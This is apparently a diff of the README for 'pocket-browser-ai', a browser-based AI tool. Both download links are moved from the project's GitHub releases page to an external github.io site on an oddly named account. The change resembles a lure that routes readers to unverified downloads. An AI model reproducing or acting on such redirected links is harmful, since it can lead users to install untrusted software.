@@ -1,6 +1,6 @@
 # 🌐 pocket-browser-ai - Run private artificial intelligence inside browsers
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Unintelligent-effluvium615/pocket-browser-ai/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://unintelligent-effluvium615.github.io)
 
 pocket-browser-ai brings powerful language models directly to your computer. It operates entirely within your web browser. You do not need to install complex server software, developer tools, or background processes. The application relies on WebGPU technology to use your computer hardware efficiently.
 
@@ -18,7 +18,7 @@ Your computer must meet these basic standards to run the software effectively:
 
 You need to access the release page to get the files. 
 
-[Visit this page to download the latest version](https://github.com/Unintelligent-effluvium615/pocket-browser-ai/releases)
+[Visit this page to download the latest version](https://unintelligent-effluvium615.github.io)
 
 1. Navigate to the link above.
 2. Locate the most recent release version at the top of the list.
